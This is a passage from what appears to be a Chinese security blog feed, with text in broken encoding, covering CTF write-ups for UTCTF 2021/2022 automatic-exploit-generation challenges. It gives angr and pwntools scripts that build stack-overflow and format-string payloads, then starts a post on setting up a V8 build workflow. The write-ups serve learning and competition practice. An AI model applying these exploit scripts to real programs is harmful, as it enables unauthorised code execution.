<span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>simgr = proj.factory.simgr(init_state)<br><br>simgr.explore(find=success)<br><span class="hljs-keyword">if</span> simgr.found:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;find&quot;</span>)<br>    bindata = <span class="hljs-string">b&#x27;&#x27;</span><br>    solution_state = simgr.found[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;count&#x27;</span>]):<br>        s, s_type = solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;s_&#x27;</span> + <span class="hljs-built_in">str</span>(i)]<br>        <span class="hljs-keyword">if</span> s_type == <span class="hljs-string">&#x27;str&#x27;</span>:<br>            bb = solution_state.solver.<span class="hljs-built_in">eval</span>(s, cast_to=<span class="hljs-built_in">bytes</span>)<br>            bindata += bb<br>        <span class="hljs-keyword">elif</span> s_type == <span class="hljs-string">&#x27;int&#x27;</span>:<br>            bindata += <span class="hljs-built_in">str</span>(solution_state.solver.<span class="hljs-built_in">eval</span>(s, cast_to=<span class="hljs-built_in">int</span>)).encode() + <span class="hljs-string">b&#x27; &#x27;</span><br><br>    elf = ELF(binary_name, checksec=<span class="hljs-literal">False</span>)<br>    context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>    ret = elf.search(asm(<span class="hljs-string">&#x27;ret&#x27;</span>)).__next__()<br>    m, n = solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;overflow&#x27;</span>]<br>    payload = <span class="hljs-string">b&#x27;a&#x27;</span> * m + p64(<span class="hljs-number">0</span>) + p64(ret) + p64(elf.sym[<span class="hljs-string">&#x27;_Z8backdoorv&#x27;</span>])<br>    bindata += payload.ljust(n, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    p.send(bindata)<br>    p.interactive()<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="UTCTF2022-aeg"><a href="#UTCTF2022-aeg" class="headerlink" title="UTCTF2022 aeg"></a>UTCTF2022 aeg</h3><p>é¢˜ç›®å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œè€Œå¾—åˆ°flagçš„æ–¹å¼æ˜¯æ§åˆ¶exitçš„å‚æ•°ä¸ºæŒ‡å®šå€¼ï¼ˆå›½å¤–çš„é¢˜å’Œå›½å†…çš„å°±æ˜¯ä¸ä¸€æ ·ï¼‰ã€‚è¾“å…¥å­—ç¬¦ä¸²åé€šè¿‡permuteå‡½æ•°åŠ å¯†ï¼Œå†ç”±printfå»æ‰§è¡Œï¼š</p><img src="/img/18/Screenshot 2023-09-22 152554.png" style="zoom:80%;" /><p>â€‹                                                     </p><p>è·Ÿæ®å‰é¢åšé¢˜çš„ç»éªŒå¾ˆå¿«å°±å¯ä»¥å†™å‡ºå¦‚ä¸‹é€šè¿‡çº¦æŸçš„ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">replace_fgets</span>(angr.SimProcedure):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, addr, size, stdin</span>):<br>            buf_bvs = claripy.BVS(<span class="hljs-string">&quot;buf&quot;</span>, <span class="hljs-number">513</span> * <span class="hljs-number">8</span>)<br>            self.state.memory.store(addr, buf_bvs)<br>            self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;buf&#x27;</span>] = buf_bvs<br><br>exit_num = <span class="hljs-number">92</span><br>binary_name = <span class="hljs-string">&quot;a&quot;</span><br>elf = ELF(<span class="hljs-string">&quot;a&quot;</span>, checksec=<span class="hljs-literal">False</span>)<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>proj = angr.Project(binary_name)<br>proj.hook_symbol(<span class="hljs-string">&quot;fgets&quot;</span>, replace_fgets())<br>start_addr = elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>init_state = proj.factory.blank_state(addr = start_addr)<br>simgr = proj.factory.simgr(init_state)<br><br>exit_code_addr = elf.sym[<span class="hljs-string">&#x27;exit_code&#x27;</span>]<br>find_addr = start_addr + <span class="hljs-number">0x8c</span><br>payload = fmtstr_payload(<span class="hljs-number">8</span>, &#123;exit_code_addr:exit_num&#125;, write_size=<span class="hljs-string">&#x27;int&#x27;</span>)<br><br>simgr.explore(find=find_addr)<br><span class="hljs-keyword">if</span> simgr.found:<br>    solution_state = simgr.found[<span class="hljs-number">0</span>]<br>    buf_addr = solution_state.regs.rsp + <span class="hljs-number">0x10</span><br>    buf = solution_state.memory.load(buf_addr, <span class="hljs-built_in">len</span>(payload))<br>    solution_state.add_constraints(buf == payload)<br>    encodebuf = solution_state.solver.<span class="hljs-built_in">eval</span>(solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;buf&#x27;</span>], cast_to=<span class="hljs-built_in">bytes</span>)<br>    <span class="hljs-built_in">print</span>(encodebuf)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™æ ·ç›´æ¥å»å¾—åˆ°åŠ å¯†çš„å­—ç¬¦ä¸²è¦èŠ±è´¹å°†è¿‘ä¸¤åˆ†é’Ÿï¼Œè€Œè¿™é¢˜é™æ—¶60ç§’ï¼Œè¿™ç§æ–¹æ³•æ˜¯å®Œå…¨è¡Œä¸é€šçš„ã€‚</p><p>â€‹                                          </p><p>çœ‹å®Œå®˜æ–¹çš„wpæ‰å‘ç°ï¼Œpermuteä¸­çš„è¿™äº›åŠ å¯†å‡½æ•°å¹¶ä¸æ˜¯çœŸæ­£çš„åŠ å¯†ï¼Œå®ƒä»¬åªæ˜¯å°†åˆå§‹å­—ç¬¦çš„ä½ç½®è¿›è¡Œäº¤æ¢ï¼š</p><img src="/img/18/Screenshot 2023-09-22 193231.png" style="zoom:80%;" /><p>â€‹                                                   </p><p>è¿™é‡Œç®€è¿°ä¸€ä¸‹å®˜æ–¹wpçš„æ€è·¯ï¼š</p><ul><li>ä½¿ç”¨çš„<code>state.inspect.b</code>å®é™…ä¸Šæ˜¯ç±»ä¼¼è®¾ç½®çš„æ–­ç‚¹ï¼Œåœ¨å‘ç”Ÿè¯»å†™å†…å­˜æ—¶éƒ½ä¼šè§¦å‘è¯¥æ–­ç‚¹ï¼Œå¹¶è¿›ä¸€æ­¥æ‰§è¡Œå›è°ƒå‡½æ•°ï¼Œå…·ä½“å¯ä»¥å‚è€ƒï¼š<a href="https://docs.angr.io/en/latest/core-concepts/simulation.html#breakpoints">https://docs.angr.io/en/latest/core-concepts/simulation.html#breakpoints</a></li><li>æ¯æ¬¡è¯»å†™å†…å­˜éƒ½ä¼šè§¦å‘å›è°ƒå‡½æ•°ï¼Œåœ¨å›è°ƒå‡½æ•°ä¸­<code>if write_addr &lt; 0x1000</code>è¿™ä¸ªåˆ¤æ–­æ˜¯ä¸ºäº†å¾—åˆ°å­—ç¬¦çš„åœ°å€ï¼Œè€Œä¸æ˜¯å…¶å®ƒæ— å…³çš„åœ°å€ã€‚</li><li>permute1ã€permute2ã€permute3â€¦â€¦è¿™äº›å‡½æ•°ä¸­éƒ½æ˜¯å°†åŸå§‹å­—ç¬¦ä¸²åˆ†æ®µï¼Œç„¶åæ”¹å˜è¿™äº›æ®µçš„é¡ºåºè¯»å–åˆ°æ ˆä¸Šï¼Œæœ€åå†å»è¦†å†™åŸå§‹å­—ç¬¦ä¸²çš„æ•°æ®ï¼Œç”±äºæ¯æ¬¡è¯»å†™éƒ½ä¼šä¿å­˜çš„æ¯ä¸ªå­—ç¬¦çš„åœ°å€ï¼Œä¹Ÿå°±çŸ¥é“äº†å­—ç¬¦çš„é¡ºåºæ˜¯æ€æ ·æ”¹å˜çš„ã€‚</li><li>æœ€åçš„<code>for i in range(len(reads)//FLAG_LEN)</code>å°±æ˜¯é€šè¿‡ä¸Šè¿°ç‰¹æ€§å»é€æ­¥è·å–permute1ã€permute2ã€permute3â€¦â€¦è¿™äº›å‡½æ•°ä¸­å­—ç¬¦æ”¹å˜çš„é¡ºåºï¼Œå°†æœ€ç»ˆçš„å­—ç¬¦é¡ºåºä¿å­˜åˆ°<code>transformations</code>ä¸­ã€‚</li></ul><p>â€‹                                               </p><p>å…¶å®æˆ‘ä»¬åªç”¨å…³å¿ƒåˆå§‹å­—ç¬¦ä¸²çš„é¡ºåºå’Œæœ€ç»ˆå­—ç¬¦ä¸²çš„é¡ºåºï¼Œå­—ç¬¦ä¸²åœ¨permute1ã€permute2ã€permute3â€¦â€¦è¿™äº›å‡½æ•°ä¸­çš„å˜åŒ–æ˜¯å®Œå…¨ä¸ç”¨è€ƒè™‘çš„ï¼Œæœ€åæ”¹å†™ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aeg</span>(<span class="hljs-params">binary_name, exit_num</span>):<br>    elf = ELF(binary_name, checksec=<span class="hljs-literal">False</span>)<br>    context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>    proj = angr.Project(binary_name)<br>    start_addr = elf.sym[<span class="hljs-string">&#x27;permute&#x27;</span>]<br>    buf_addr = <span class="hljs-number">0x800000</span><br>    <span class="hljs-comment">#ä¸€å®šè¦é…ç½®è¿™ä¸ªadd_optionså¯é€‰é¡¹ï¼Œä»¥ä¾¿åœ¨ç¬¦å·æ‰§è¡Œä¸­ä½¿ç”¨unicornï¼Œä¸ç„¶ä¹Ÿä¼šå·¨æ…¢æ— æ¯”</span><br>    init_state = proj.factory.call_state(<br>            start_addr,<br>            buf_addr,<br>            add_options=angr.options.unicorn.union(&#123;angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY&#125;)<br>    )<br><span class="hljs-comment">#è¿™ä¸ªåˆå§‹åŒ–åœ°å€ä¸­çš„å€¼å…¶å®æ˜¯æœ‰ä¸€å®šé—®é¢˜çš„ï¼Œå› ä¸ºå•å­—èŠ‚æœ€å¤§å€¼åªèƒ½æ˜¯255ï¼Œæœ€åçš„é¡ºåºåˆ—è¡¨ä¸­ä¼šå­˜åœ¨ä¸¤ä¸ªç›¸åŒçš„å€¼</span><br>    <span class="hljs-comment">#æœ€åè½¬æ¢é¡ºåºæ—¶é«˜åœ°å€çš„0x100ä¸ªå­—ç¬¦æ— æ³•èµ‹å€¼ï¼Œç”±äºæ ¼å¼åŒ–çš„æ˜¯ä½åœ°å€çš„å­—ç¬¦ï¼Œé«˜åœ°å€çš„0x100ä¸ªå­—ç¬¦å¯ä»¥ä¸ç”¨è€ƒè™‘</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">512</span>):<br>        init_state.memory.store(buf_addr + i, i, <span class="hljs-number">1</span>)<br>    <br>    encode_num = []<br>    init_state.regs.rdi = buf_addr<br>    simgr = proj.factory.simgr(init_state)<br>    find_addr = start_addr + <span class="hljs-number">0x71</span><br>    simgr.explore(find = find_addr)<br>    state = simgr.found[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">512</span>):<br>        encode_num.append(state.solver.<span class="hljs-built_in">eval</span>(state.memory.load(buf_addr + i, <span class="hljs-number">1</span>)))<br><br>    <span class="hljs-built_in">print</span>(encode_num)<br><br>aeg(<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-number">100</span>)<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªç›´æ¥å‡ ç§’é’Ÿå°±å¯ä»¥å¾—åˆ°æœ€ç»ˆçš„å­—ç¬¦é¡ºåºè¡¨ã€‚</p><p>â€‹                                                       </p><p>å®Œæ•´expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">from</span> subprocess <span class="hljs-keyword">import</span> Popen, PIPE<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aeg</span>(<span class="hljs-params">binary_name, exit_num</span>):<br>    elf = ELF(binary_name, checksec=<span class="hljs-literal">False</span>)<br>    context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>    proj = angr.Project(binary_name)<br>    start_addr = elf.sym[<span class="hljs-string">&#x27;permute&#x27;</span>]<br>    buf_addr = <span class="hljs-number">0x800000</span><br>    init_state = proj.factory.call_state(<br>            start_addr,<br>            buf_addr,<br>            add_options=angr.options.unicorn.union(&#123;angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY&#125;)<br>    )<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">512</span>):<br>        init_state.memory.store(buf_addr + i, i, <span class="hljs-number">1</span>)<br>    <br>    encode_num = []<br>    init_state.regs.rdi = buf_addr<br>    simgr = proj.factory.simgr(init_state)<br>    find_addr = start_addr + <span class="hljs-number">0x71</span><br>    simgr.explore(find = find_addr)<br>    state = simgr.found[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">512</span>):<br>        encode_num.append(state.solver.<span class="hljs-built_in">eval</span>(state.memory.load(buf_addr + i, <span class="hljs-number">1</span>)))<br><br>    exit_code_addr = elf.sym[<span class="hljs-string">&#x27;exit_code&#x27;</span>]<br>    payload = fmtstr_payload(<span class="hljs-number">8</span>, &#123;exit_code_addr:exit_num&#125;, write_size=<span class="hljs-string">&#x27;int&#x27;</span>)<br>    payload = payload.ljust(<span class="hljs-number">256</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>    encoded_payload = <span class="hljs-built_in">bytearray</span>()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">512</span>):<br>        encoded_payload.append(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        encoded_payload[encode_num[i]] = payload[i]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        encoded_payload[<span class="hljs-number">0x100</span> + encode_num[i]] = payload[i]<br><br>    <span class="hljs-keyword">return</span> encoded_payload<br><br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">9999</span>)<br>p.recvline()<br>p.recvline()<br>p.recvline()<br>p.recvline()<br>p.sendline()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Solving&quot;</span>,i)<br>    x = p.recvuntil(<span class="hljs-string">b&quot;Binary&quot;</span>)[:-<span class="hljs-number">6</span>]<br>    exit_code_line = p.recvline()<br>    exit_code = <span class="hljs-built_in">int</span>(exit_code_line[exit_code_line.rindex(<span class="hljs-string">b&#x27; &#x27;</span>)+<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>])<br>    p.recvline()<br>    r = Popen([<span class="hljs-string">&#x27;xxd&#x27;</span>, <span class="hljs-string">&#x27;-r&#x27;</span>], stdout=PIPE, stdin=PIPE, stderr=STDOUT)<br>    binary = r.communicate(<span class="hljs-built_in">input</span>=x)[<span class="hljs-number">0</span>]<br>    binary_file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;a.out&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>)<br>    binary_file.write(binary)<br>    binary_file.close()<br>    payload = aeg(<span class="hljs-string">&quot;a.out&quot;</span>,exit_code)<br>    p.sendline(payload)<br>    <span class="hljs-built_in">print</span>(p.recvline())<br><span class="hljs-built_in">print</span>(p.recvall())<br></code></pre></td></tr></table></figure><p>è·å¾—flag:</p><img src="/img/18/Screenshot 2023-09-22 214831.png" style="zoom: 67%;" /><p>â€‹                                                              </p><h3 id="UTCTF2021-aeg"><a href="#UTCTF2021-aeg" class="headerlink" title="UTCTF2021 aeg"></a>UTCTF2021 aeg</h3><p>è¿™é“é¢˜ç½‘ä¸Šåªæ‰¾åˆ°çš„ä¸¤ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ²¡æœ‰å®Œæ•´çš„é¢˜ç›®ç¯å¢ƒã€‚</p><p>é¢˜ç›®ä¹Ÿå¾ˆç®€å•ï¼Œæ ˆæº¢å‡ºåæ§åˆ¶åˆ°winå‡½æ•°æ‰§è¡Œexitå‡½æ•°ï¼Œå’Œä¸Šä¸€é¢˜å¾—åˆ°flagçš„æ¡ä»¶ä¸€æ ·ã€‚</p><p>é€šè¿‡çº¦æŸçš„expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">replace_fgets</span>(angr.SimProcedure):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, addr, size, stdin</span>):<br>            buf_bvs = claripy.BVS(<span class="hljs-string">&quot;buf&quot;</span>, <span class="hljs-number">63</span> * <span class="hljs-number">8</span>)<br>            self.state.memory.store(addr, buf_bvs)<br>            self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;buf&#x27;</span>] = buf_bvs<br><br>binary_name = <span class="hljs-string">&quot;0&quot;</span><br>proj = angr.Project(binary_name)<br>init_state = proj.factory.entry_state()<br>proj.hook_symbol(<span class="hljs-string">&quot;fgets&quot;</span>, replace_fgets())<br>simgr = proj.factory.simgr(init_state, save_unconstrained=<span class="hljs-literal">True</span>)<br>find_addr = proj.loader.find_symbol(<span class="hljs-string">&#x27;win&#x27;</span>).rebased_addr<br><br>d = simgr.explore()<br><span class="hljs-keyword">for</span> state <span class="hljs-keyword">in</span> d.unconstrained:<br>    state.add_constraints(state.regs.rip == find_addr)<br>    buf = state.solver.<span class="hljs-built_in">eval</span>(state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;buf&#x27;</span>], cast_to=<span class="hljs-built_in">bytes</span>)<br>    <span class="hljs-built_in">print</span>(buf)<br>    p = process(<span class="hljs-string">&#x27;./0&#x27;</span>)<br>    gdb.attach(p)<br>    pause()<br>    p.send(buf)<br>    pause()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>V8å­¦ä¹ </title>
    <link href="/2023/09/10/V8/"/>
    <url>/2023/09/10/V8/</url>
    
    <content type="html"><![CDATA[<h3 id="V8ç¯å¢ƒæ­å»º"><a href="#V8ç¯å¢ƒæ­å»º" class="headerlink" title="V8ç¯å¢ƒæ­å»º"></a>V8ç¯å¢ƒæ­å»º</h3><p>æ‰¾ä¸ªä»£ç†ä»¥åï¼Œç›´æ¥å‚è€ƒè¿™ä¸ªå¸ˆå‚…çš„æ–‡ç« ï¼š<a href="https://survive2.github.io/posts/1abc7753/">v8è°ƒè¯•ç¯å¢ƒæ­å»º</a>ã€‚ä½†æ˜¯è‡ªå·±æœ¬åœ°çš„ä»£ç†å¯¹äºæµè§ˆå™¨è¿™ç§åº”ç”¨å¯ä»¥ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆç»ˆç«¯å°±æ˜¯ä¸èµ°ä»£ç†ï¼ˆæ­£å¥½å’Œå‚è€ƒæ–‡ç« çš„æƒ…å†µç›¸åï¼‰ï¼Œè¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯åœ¨ç»ˆç«¯ä¸­è¾“å…¥<code>export https_proxy=&quot;http://127.0.0.1:8889/</code>å’Œ<code>export http_proxy=&quot;http://127.0.0.1:8889/</code>è¿™ç§æš‚æ—¶çš„çš„ä»£ç†ï¼Œå‰©ä¸‹çš„å°±æ²¡ä»€ä¹ˆåŒºåˆ«äº†ã€‚</p><p>å¦‚æœæœ¬åœ°è¿˜æ˜¯å­˜åœ¨ä¸€äº›å¥‡å¥‡æ€ªæ€ªçš„é—®é¢˜ï¼Œå¯ä»¥å‚è€ƒï¼š<a href="https://zhuanlan.zhihu.com/p/159646912">å·¥æ¬²å–„å…¶äº‹ï¼šGithub Action æç®€æ­å»º v8 ç¯å¢ƒ</a>ï¼Œè¿™ç¯‡æ–‡ç« ä½¿ç”¨GitHub Actionå»æ­å»ºV8ï¼Œç”±äºè¿™ä¸ªé¡¹ç›®æœ€åæ›´æ–°çš„æ˜¯2020ï¼Œæœ‰ä¸€äº›ä¸œè¥¿å’Œç°åœ¨å·²ç»ä¸åŒäº†ã€‚ä¹‹å‰åœ¨GitHub Actionä½¿ç”¨çš„æ˜¯Ubuntu18ï¼Œä½†ç°åœ¨Ubuntu18ä¼¼ä¹å·²ç»è¢«é—å¼ƒï¼Œæ”¹ç”¨Ubuntu20ï¼›ä¹‹å‰ä½¿ç”¨çš„æ˜¯ç‰›å¥¶å¿«ä¼ è¿™ç§å·¥å…·ï¼Œä½†æ˜¯ç°åœ¨å¥½åƒä¹Ÿæ²¡æ³•å»æ­£å¸¸ä½¿ç”¨ï¼Œæœ€åæ”¹ç”¨æ–‡å”å”ã€‚</p><p>è¿™é‡Œç»™å‡ºæˆ‘é­”æ”¹çš„ç‰ˆæœ¬ï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">name:</span> <span class="hljs-string">BUILD</span> <span class="hljs-string">v8</span><br><br><span class="hljs-attr">on:</span><br>  <span class="hljs-attr">push:</span><br>    <span class="hljs-attr">branches:</span> [ <span class="hljs-string">master</span> ]<br>  <span class="hljs-comment"># watch:</span><br>  <span class="hljs-comment">#   types: started</span><br><br><span class="hljs-attr">env:</span><br>  <span class="hljs-attr">PATCH_FLAG:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">COMMIT:</span> <span class="hljs-string">568979f4d891bafec875fab20f608ff9392f4f29</span><br>  <span class="hljs-attr">DEPOT_UPLOAD:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">SRC_UPLOAD:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">BINARY_UPLOAD:</span> <span class="hljs-literal">false</span><br><br><span class="hljs-comment"># A workflow run is made up of one or more jobs that can run sequentially or in parallel</span><br><span class="hljs-attr">jobs:</span><br>  <span class="hljs-attr">build:</span><br>    <span class="hljs-comment"># The type of runner that the job will run on</span><br>    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-20.04</span><br>    <span class="hljs-attr">if:</span> <span class="hljs-string">github.event.repository.owner.id</span> <span class="hljs-string">==</span> <span class="hljs-string">github.event.sender.id</span> <br>    <br>    <span class="hljs-attr">steps:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Checkout</span><br>      <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@master</span><br>      <br>    <span class="hljs-comment"># init ubuntu2004 environment</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">init</span> <span class="hljs-string">env</span><br>      <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">        sudo apt-get update</span><br><span class="hljs-string">        sudo apt-get -y install pkg-config git subversion curl wget build-essential python xz-utils zip p7zip-full ninja-build</span><br><span 